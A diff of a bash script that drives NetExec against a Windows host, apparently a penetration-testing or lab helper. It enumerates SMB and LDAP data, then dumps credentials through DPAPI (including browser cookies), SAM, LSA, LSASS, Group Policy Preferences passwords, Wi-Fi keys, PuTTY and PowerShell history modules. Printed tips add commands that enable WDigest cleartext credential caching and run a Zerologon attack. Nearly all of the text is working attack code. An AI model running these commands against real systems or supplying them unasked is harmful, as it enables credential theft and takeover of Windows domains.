@@ -19,7 +19,7 @@ command -v nxc >/dev/null || { echo "nxc not in PATH"; exit 1; }
 
 log(){ echo -e "\n==== $* ====\n"; }
 
-# Auth modes
+# Auth mode
 if [[ -n "$DOMAIN" ]]; then
   MODE="domain"
   BASE=(-d "$DOMAIN" -u "$USER" -p "$PASS")
@@ -29,72 +29,71 @@ else
 fi
 log "Auth mode: $MODE"
 
-# Capabilities
-HELP="$(nxc smb -h 2>&1 || true)"
-have_flag(){ grep -q -- "$1" <<<"$HELP"; }
-have_mod(){ nxc smb -L 2>/dev/null | awk '{print $1}' | sed 's/^-//' | grep -q "^$1$"; }
 
 ## 1) SMB recon (per-flag, clear output)
-for f in --shares --users --pass-pol --loggedon-users --qwinsta --wdigest --gpp-password --gpp_autologin --zerologon; do
-  if have_flag "$f"; then
-    log "Now running SMB flag: $f"
-    nxc smb "$IP" "${BASE[@]}" "$f" || true
-  else
-    log "SMB flag not supported in this build: $f"
-  fi
+FLAGS=(--shares --users --pass-pol --loggedon-users --qwinsta)
+
+for f in "${FLAGS[@]}"; do
+  log "SMB flag: $f"
+  nxc smb "$IP" "${BASE[@]}" "$f" || true
 done
 
 ## 1b) LDAP recon (only when domain auth)
 if [[ "$MODE" == "domain" ]]; then
-  if nxc ldap -h 2>&1 | grep -q -- "--groups"; then
-    log "Now running LDAP: --groups"
-    nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
-  else
-    log "LDAP --groups not supported in this build"
-  fi
+  log "LDAP: --groups"
+  nxc ldap "$IP" -d "$DOMAIN" -u "$USER" -p "$PASS" --groups || true
 else
-  log "Skipping LDAP --groups (needs domain auth)"
+  log "Skip LDAP (needs domain auth)"
 fi
 
 ## 2) DPAPI variants
-if have_flag "--dpapi"; then
-  log "DPAPI: base"
-  nxc smb "$IP" "${BASE[@]}" --dpapi || true
+log "DPAPI base"
+nxc smb "$IP" "${BASE[@]}" --dpapi || true
 
-  log "DPAPI: cookies"
-  nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true
+log "DPAPI cookies"
+nxc smb "$IP" "${BASE[@]}" --dpapi cookies || true
 
-  log "DPAPI: nosystem"
-  nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true
+log "DPAPI nosystem"
+nxc smb "$IP" "${BASE[@]}" --dpapi nosystem || true
 
-  if [[ "$MODE" == "local" ]]; then
-    log "DPAPI: nosystem (explicit local-auth)"
-    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
-  else
-    log "Skipping DPAPI local-auth variant (domain mode)"
-  fi
+if [[ "$MODE" == "local" ]]; then
+  log "DPAPI nosystem (explicit local-auth)"
+  nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" --dpapi nosystem || true
+else
+  log "Skip DPAPI local-auth variant (domain mode)"
 fi
 
 ## 3) Modules
-NOT_AVAILABLE=()
-for m in spider_plus sam lsa lsass putty backup_operator rdcman; do
-  if have_mod "$m"; then
+MODULES=(spider_plus gpp_password gpp_autologin wifi putty powershell_history lsassy rdcman backup_operator)
+LOCAL_ADMIN_MODULES=(sam lsa lsass)
+
+# Run local-admin only modules if not in domain mode
+if [[ "$MODE" == "local" ]]; then
+  for m in "${LOCAL_ADMIN_MODULES[@]}"; do
+    log "Module (local-admin): $m"
+    nxc smb "$IP" --local-auth -u "$USER" -p "$PASS" -M "$m" || true
+  done
+else
+  for m in "${MODULES[@]}"; do
     log "Module: $m"
     nxc smb "$IP" "${BASE[@]}" -M "$m" || true
-  else
-    NOT_AVAILABLE+=("$m")
-  fi
-done
-
-if [[ ${#NOT_AVAILABLE[@]} -gt 0 ]]; then
-  log "Modules not supported by this nxc build (or need --local-auth i.e: remove the -d): ${NOT_AVAILABLE[*]}"
+  done
 fi
+
+log "Done"
 
 # Final notes (printed only)
 log "Summary / Tips"
 cat <<'EOT'
 - Domain mode is used when -d <DOMAIN> is provided; otherwise the script uses --local-auth.
 - LDAP --groups runs only in domain mode.
-- Some modules need local admin (sam/lsa/lsass/putty/ldapi). backup_operator needs SeBackupPrivilege.
+- Some modules need local admin (sam/lsa/lsass/putty/rdcman/backup_operator).
 - DPAPI variants run in both modes; the explicit local-auth variant runs only in local mode.
+- Extra modules you can run manually if needed:
+    * WDigest (enable cleartext creds in LSASS):
+        nxc smb <IP> <auth> -M wdigest -o ACTION=enable
+      Cleanup afterwards (IRL):
+        nxc smb <IP> <auth> -M wdigest -o ACTION=disable
+    * Zerologon (high impact, only run in lab):
+        nxc smb <IP> <auth> -M zerologon
 EOT
